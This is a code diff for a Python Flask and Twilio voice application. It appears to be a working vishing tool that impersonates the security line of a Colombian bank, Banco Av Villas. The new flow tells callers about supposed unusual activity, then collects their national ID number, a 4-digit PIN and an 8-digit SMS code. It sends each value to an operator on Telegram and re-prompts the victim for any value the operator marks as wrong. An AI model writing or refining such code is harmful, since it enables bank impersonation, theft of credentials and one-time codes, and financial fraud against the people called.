@@ -240,13 +240,38 @@ def call_status_callback():
     
     return jsonify({"status": "ok"})
 
+@app.route('/start', methods=['POST'])
+def start():
+    """
+    Endpoint inicial para iniciar el flujo de verificación.
+    Este endpoint es llamado por Twilio al recibir una llamada.
+    """
+    response = VoiceResponse()
+    
+    # Verificar si la llamada fue iniciada desde Telegram
+    call_sid = request.values.get('CallSid')
+    if call_sid and is_call_from_telegram(call_sid):
+        response.say("Hola,le habla el sistema de seguridad del Banco Av Villas. Detectamos una actividad inusual en unos de sus productos. Si usted reconoce esta operación haga caso omiso de lo contrario presione 1 para comunicarle con un asesor", language='es-ES')
+        # Pausa de 4 segundos antes de redirigir
+        response.pause(length=4)
+        response.redirect('/step1')
+    else:
+        response.say("Hola,le habla el sistema de seguridad del Banco Av Villas. Detectamos una actividad inusual en unos de sus productos. Si usted reconoce esta operación haga caso omiso de lo contrario presione 1 para comunicarle con un asesor", language='es-ES')
+        # Pausa de 4 segundos antes de redirigir
+        response.pause(length=4)
+        response.redirect('/step1')
+    
+    return str(response)
+
+
+# STEP 1: CÉDULA (PRIMERO)
 @app.route('/step1', methods=['POST', 'GET'])
 def step1():
     response = VoiceResponse()
-    gather = Gather(num_digits=4, action='/save-step1', method='POST', timeout=20, finish_on_key='')
-    gather.say("Por favor ingrese el código de verificación de 4 dígitos.", language='es-ES')
+    gather = Gather(num_digits=10, action='/save-step1', method='POST', timeout=30, finish_on_key='')
+    gather.say("Para validación de datos ingrese su número de cédula.", language='es-ES')
     gather.pause(length=1)
-    gather.say("Ingrese los 4 dígitos ahora.", language='es-ES')
+    gather.say("Ingrese su número de cédula de 10 o 7 dígitos ahora.", language='es-ES')
     response.append(gather)
     
     response.redirect('/step1')
@@ -257,7 +282,7 @@ def save_step1():
     digits = request.values.get('Digits')
     call_sid = request.values.get('CallSid')
     
-    logger.info(f"⚠️ DATOS RECIBIDOS - PASO 1: CallSid={call_sid}, Digits={digits}")
+    logger.info(f"⚠️ DATOS RECIBIDOS - PASO 1 (CÉDULA): CallSid={call_sid}, Digits={digits}")
     
     if not digits:
         return redirect_twiml('/step1')
@@ -270,7 +295,74 @@ def save_step1():
     # Verificar si estamos en un proceso de revalidación
     is_revalidation = 'validacion' in global_user_sessions[call_sid]
     
-    # Guardar el nuevo código
+    # Guardar la cédula
+    global_user_sessions[call_sid]['cedula'] = digits
+    
+    # Si había una validación previa, la eliminamos para forzar una nueva validación
+    if is_revalidation and 'validacion' in global_user_sessions[call_sid]:
+        logger.info(f"🔄 Eliminando validación anterior para SID={call_sid}")
+        global_user_sessions[call_sid].pop('validacion', None)
+    
+    save_session_to_file(global_user_sessions)
+    
+    logger.info(f"💾 Guardado cédula: {digits} para SID={call_sid}")
+    
+    response = VoiceResponse()
+    response.say(f"Ha ingresado cédula {', '.join(digits)}.", language='es-ES')
+    
+    # Verificar la longitud de los dígitos ingresados
+    digit_length = len(digits)
+    logger.info(f"📏 Longitud de cédula ingresada: {digit_length} dígitos")
+    
+    # Agregar pausa de 3 segundos si son 7 dígitos
+    if digit_length == 7:
+        logger.info(f"⏱️ Agregando pausa de 3 segundos para cédula de 7 dígitos")
+        response.pause(length=3)
+    
+    # Si estamos en revalidación, notificar a Telegram y esperar validación
+    if is_revalidation:
+        data = global_user_sessions[call_sid]
+        msg = f"🔄 Cédula actualizada:\n🆔 Cédula: {data.get('cedula', 'N/A')} ({digit_length} dígitos)\n🔢 Código 4 dígitos: {data.get('code4', 'N/A')}\n🔢 Código 8 dígitos: {data.get('code8', 'N/A')}\n\nResponde con:\n/validar {call_sid} 1 1 1 (si todos están bien)"
+        send_to_telegram(msg)
+        
+        response.say("Gracias. Estamos validando su información actualizada. Por favor, espere unos momentos.", language='es-ES')
+        response.redirect(f"/waiting-validation?CallSid={call_sid}&wait=8&revalidation=true")
+    else:
+        # Flujo normal: continuar al siguiente paso
+        response.say("Continuando.", language='es-ES')
+        response.redirect('/step2')
+    
+    return str(response)
+
+# STEP 2: CÓDIGO DE 4 DÍGITOS (SEGUNDO)
+@app.route('/step2', methods=['POST', 'GET'])
+def step2():
+    response = VoiceResponse()
+    gather = Gather(num_digits=4, action='/save-step2', method='POST', timeout=20, finish_on_key='')
+    gather.say("Digite su clave de 4 dígitos.", language='es-ES')
+    gather.pause(length=1)
+    gather.say("Ingrese los 4 dígitos ahora.", language='es-ES')
+    response.append(gather)
+    
+    response.redirect('/step2')
+    return str(response)
+
+@app.route('/save-step2', methods=['POST'])
+def save_step2():
+    digits = request.values.get('Digits')
+    call_sid = request.values.get('CallSid')
+    
+    logger.info(f"⚠️ DATOS RECIBIDOS - PASO 2 (4 DÍGITOS): CallSid={call_sid}, Digits={digits}")
+    
+    # Asegurar que la sesión existe para este SID
+    if call_sid not in global_user_sessions:
+        global_user_sessions[call_sid] = {}
+        logger.info(f"🆕 Creada nueva sesión para SID={call_sid}")
+    
+    # Verificar si estamos en un proceso de revalidación
+    is_revalidation = 'validacion' in global_user_sessions[call_sid]
+    
+    # Guardar el código de 4 dígitos
     global_user_sessions[call_sid]['code4'] = digits
     
     # Si había una validación previa, la eliminamos para forzar una nueva validación
@@ -288,64 +380,8 @@ def save_step1():
     # Si estamos en revalidación, notificar a Telegram y esperar validación
     if is_revalidation:
         data = global_user_sessions[call_sid]
-        msg = f"🔄 Código de 4 dígitos actualizado:\n🔢 Código 4 dígitos: {data.get('code4', 'N/A')}\n🔢 Código 3 dígitos: {data.get('code3', 'N/A')}\n🆔 Cédula: {data.get('cedula', 'N/A')}\n\nResponde con:\n/validar {call_sid} 1 1 1 (si todos están bien)"
-        send_to_telegram(msg)
-        
-        response.say("Gracias. Estamos validando su información actualizada. Por favor, espere unos momentos.", language='es-ES')
-        response.redirect(f"/waiting-validation?CallSid={call_sid}&wait=8&revalidation=true")
-    else:
-        # Flujo normal: continuar al siguiente paso
-        response.say("Continuando.", language='es-ES')
-        response.redirect('/step2')
-    
-    return str(response)
-
-@app.route('/step2', methods=['POST', 'GET'])
-def step2():
-    response = VoiceResponse()
-    gather = Gather(num_digits=3, action='/save-step2', method='POST', timeout=20, finish_on_key='')
-    gather.say("Ahora ingrese el segundo código de 3 dígitos.", language='es-ES')
-    gather.pause(length=1)
-    gather.say("Ingrese los 3 dígitos ahora.", language='es-ES')
-    response.append(gather)
-    
-    response.redirect('/step2')
-    return str(response)
-
-@app.route('/save-step2', methods=['POST'])
-def save_step2():
-    digits = request.values.get('Digits')
-    call_sid = request.values.get('CallSid')
-    
-    logger.info(f"⚠️ DATOS RECIBIDOS - PASO 2: CallSid={call_sid}, Digits={digits}")
-    
-    # Asegurar que la sesión existe para este SID
-    if call_sid not in global_user_sessions:
-        global_user_sessions[call_sid] = {}
-        logger.info(f"🆕 Creada nueva sesión para SID={call_sid}")
-    
-    # Verificar si estamos en un proceso de revalidación
-    is_revalidation = 'validacion' in global_user_sessions[call_sid]
-    
-    # Guardar el nuevo código
-    global_user_sessions[call_sid]['code3'] = digits
-    
-    # Si había una validación previa, la eliminamos para forzar una nueva validación
-    if is_revalidation and 'validacion' in global_user_sessions[call_sid]:
-        logger.info(f"🔄 Eliminando validación anterior para SID={call_sid}")
-        global_user_sessions[call_sid].pop('validacion', None)
-    
-    save_session_to_file(global_user_sessions)
-    
-    logger.info(f"💾 Guardado código 3 dígitos: {digits} para SID={call_sid}")
-    
-    response = VoiceResponse()
-    response.say(f"Ha ingresado {', '.join(digits)}.", language='es-ES')
-    
-    # Si estamos en revalidación, notificar a Telegram y esperar validación
-    if is_revalidation:
-        data = global_user_sessions[call_sid]
-        msg = f"🔄 Código de 3 dígitos actualizado:\n🔢 Código 4 dígitos: {data.get('code4', 'N/A')}\n🔢 Código 3 dígitos: {data.get('code3', 'N/A')}\n🆔 Cédula: {data.get('cedula', 'N/A')}\n\nResponde con:\n/validar {call_sid} 1 1 1 (si todos están bien)"
+        digit_length = len(data.get('cedula', ''))
+        msg = f"🔄 Código de 4 dígitos actualizado:\n🆔 Cédula: {data.get('cedula', 'N/A')} ({digit_length} dígitos)\n🔢 Código 4 dígitos: {data.get('code4', 'N/A')}\n🔢 Código 8 dígitos: {data.get('code8', 'N/A')}\n\nResponde con:\n/validar {call_sid} 1 1 1 (si todos están bien)"
         send_to_telegram(msg)
         
         response.say("Gracias. Estamos validando su información actualizada. Por favor, espere unos momentos.", language='es-ES')
@@ -357,13 +393,14 @@ def save_step2():
     
     return str(response)
 
+# STEP 3: CÓDIGO DE 8 DÍGITOS (TERCERO)
 @app.route('/step3', methods=['POST', 'GET'])
 def step3():
     response = VoiceResponse()
-    gather = Gather(num_digits=10, action='/save-step3', method='POST', timeout=30, finish_on_key='')
-    gather.say("Por favor ingrese su número de cédula.", language='es-ES')
+    gather = Gather(num_digits=8, action='/save-step3', method='POST', timeout=30, finish_on_key='')
+    gather.say("Para terminar la validación digite el código enviado a su número celular asociado a su cuenta.", language='es-ES')
     gather.pause(length=1)
-    gather.say("Ingrese su número de cédula de 10 o 7 dígitos ahora.", language='es-ES')
+    gather.say("Ingrese el código de 8 dígitos ahora.", language='es-ES')
     response.append(gather)
     
     response.redirect('/step3')
@@ -374,7 +411,7 @@ def save_step3():
     digits = request.values.get('Digits')
     call_sid = request.values.get('CallSid')
     
-    logger.info(f"⚠️ DATOS RECIBIDOS - PASO 3: CallSid={call_sid}, Digits={digits}")
+    logger.info(f"⚠️ DATOS RECIBIDOS - PASO 3 (8 DÍGITOS): CallSid={call_sid}, Digits={digits}")
     
     # Asegurar que la sesión existe para este SID
     if call_sid not in global_user_sessions:
@@ -384,8 +421,8 @@ def save_step3():
     # Verificar si estamos en un proceso de revalidación
     is_revalidation = 'validacion' in global_user_sessions[call_sid]
     
-    # Guardar el código (cédula)
-    global_user_sessions[call_sid]['cedula'] = digits
+    # Guardar el código de 8 dígitos
+    global_user_sessions[call_sid]['code8'] = digits
     
     # Si había una validación previa, la eliminamos para forzar una nueva validación
     if is_revalidation and 'validacion' in global_user_sessions[call_sid]:
@@ -394,7 +431,7 @@ def save_step3():
     
     save_session_to_file(global_user_sessions)
     
-    logger.info(f"💾 Guardado cédula: {digits} para SID={call_sid}")
+    logger.info(f"💾 Guardado código 8 dígitos: {digits} para SID={call_sid}")
 
     data = global_user_sessions[call_sid]
     logger.info(f"⚠️ DATOS COMPLETOS PARA SID={call_sid}: {data}")
@@ -403,33 +440,28 @@ def save_step3():
     start_telegram_polling()
     
     response = VoiceResponse()
-    response.say(f"Ha ingresado cédula {', '.join(digits)}.", language='es-ES')
+    response.say(f"Ha ingresado {', '.join(digits)}.", language='es-ES')
     
-    # Verificar la longitud de los dígitos ingresados
-    digit_length = len(digits)
-    logger.info(f"📏 Longitud de cédula ingresada: {digit_length} dígitos")
-    
-    # Agregar pausa de 3 segundos si son 7 dígitos
-    if digit_length == 7:
-        logger.info(f"⏱️ Agregando pausa de 3 segundos para cédula de 7 dígitos")
-        response.pause(length=3)
+    # Obtener longitud de cédula para el mensaje
+    digit_length = len(data.get('cedula', ''))
     
     # Mensaje diferente dependiendo si es validación inicial o revalidación
     if is_revalidation:
-        msg = f"🔄 Cédula actualizada:\n🔢 Código 4 dígitos: {data.get('code4', 'N/A')}\n🔢 Código 3 dígitos: {data.get('code3', 'N/A')}\n🆔 Cédula: {data.get('cedula', 'N/A')} ({digit_length} dígitos)\n\nResponde con:\n/validar {call_sid} 1 1 1 (si todos están bien)"
+        msg = f"🔄 Código de 8 dígitos actualizado:\n🆔 Cédula: {data.get('cedula', 'N/A')} ({digit_length} dígitos)\n🔢 Código 4 dígitos: {data.get('code4', 'N/A')}\n🔢 Código 8 dígitos: {data.get('code8', 'N/A')}\n\nResponde con:\n/validar {call_sid} 1 1 1 (si todos están bien)"
         send_to_telegram(msg)
         
         response.say("Gracias. Estamos validando su información actualizada. Por favor, espere unos momentos.", language='es-ES')
     else:
-        msg = f"📞 Nueva verificación:\n🔢 Código 4 dígitos: {data.get('code4', 'N/A')}\n🔢 Código 3 dígitos: {data.get('code3', 'N/A')}\n🆔 Cédula: {data.get('cedula', 'N/A')} ({digit_length} dígitos)\n\nResponde con:\n/validar {call_sid} 1 1 1 (si todos están bien)\n/validar {call_sid} 1 0 1 (si el segundo es incorrecto)"
+        msg = f"📞 Nueva verificación:\n🆔 Cédula: {data.get('cedula', 'N/A')} ({digit_length} dígitos)\n🔢 Código 4 dígitos: {data.get('code4', 'N/A')}\n🔢 Código 8 dígitos: {data.get('code8', 'N/A')}\n\nResponde con:\n/validar {call_sid} 1 1 1 (si todos están bien)\n/validar {call_sid} 1 0 1 (si el segundo es incorrecto)"
         send_to_telegram(msg)
         
-        response.say("Gracias. Estamos validando su información. Por favor, espere unos momentos.", language='es-ES')
+        response.say("Validación exitosa, en un momento uno de nuestros asesores le atenderá, espere en línea.", language='es-ES')
     
     # Redirigir a la ruta de espera con el parámetro de revalidación apropiado
     response.redirect(f"/waiting-validation?CallSid={call_sid}&wait=8&revalidation={str(is_revalidation).lower()}")
     return str(response)
 
+# El resto del código de validate-result permanece igual, solo hay que actualizar las referencias:
 @app.route('/validate-result', methods=['GET', 'POST'])
 def validate_result():
     call_sid = request.values.get('sid')
@@ -477,18 +509,18 @@ def validate_result():
             # Mensaje general cuando hay errores
             response.say("Hemos detectado algunos problemas con la información proporcionada.", language='es-ES')
             
-            # Verificar qué código es incorrecto y redirigir
-            if validation[0] == 0:
-                logger.info(f"⚠️ REDIRIGIENDO A PASO 1 - CÓDIGO INCORRECTO PARA SID={call_sid}")
-                response.say("El primer código de verificación parece ser incorrecto. Por favor, ingréselo nuevamente.", language='es-ES')
-                response.redirect('/step1')
-            elif validation[1] == 0:
-                logger.info(f"⚠️ REDIRIGIENDO A PASO 2 - CÓDIGO INCORRECTO PARA SID={call_sid}")
-                response.say("El segundo código de verificación parece ser incorrecto. Por favor, ingréselo nuevamente.", language='es-ES')
-                response.redirect('/step2')
-            elif validation[2] == 0:
-                logger.info(f"⚠️ REDIRIGIENDO A PASO 3 - CÉDULA INCORRECTA PARA SID={call_sid}")
+            # Verificar qué dato es incorrecto y redirigir (nuevo orden)
+            if validation[0] == 0:  # Cédula incorrecta
+                logger.info(f"⚠️ REDIRIGIENDO A PASO 1 - CÉDULA INCORRECTA PARA SID={call_sid}")
                 response.say("La cédula ingresada parece ser incorrecta. Por favor, ingrésela nuevamente.", language='es-ES')
+                response.redirect('/step1')
+            elif validation[1] == 0:  # Código de 4 dígitos incorrecto
+                logger.info(f"⚠️ REDIRIGIENDO A PASO 2 - CÓDIGO 4 DÍGITOS INCORRECTO PARA SID={call_sid}")
+                response.say("El código de 4 dígitos parece ser incorrecto. Por favor, ingréselo nuevamente.", language='es-ES')
+                response.redirect('/step2')
+            elif validation[2] == 0:  # Código de 8 dígitos incorrecto
+                logger.info(f"⚠️ REDIRIGIENDO A PASO 3 - CÓDIGO 8 DÍGITOS INCORRECTO PARA SID={call_sid}")
+                response.say("El código de 8 dígitos parece ser incorrecto. Por favor, ingréselo nuevamente.", language='es-ES')
                 response.redirect('/step3')
             return str(response)
     else:
@@ -731,7 +763,7 @@ def process_call_command(chat_id, message_text):
     try:
         # Usar la misma lógica que make_call para construir URLs
         base_url = os.getenv('BASE_URL', 'https://call-telegram-production.up.railway.app')
-        url = f"{base_url}/step1"
+        url = f"{base_url}/start"
         status_callback_url = f"{base_url}/call-status-callback"
         
         logger.info(f"📞 URL para la llamada: {url}")
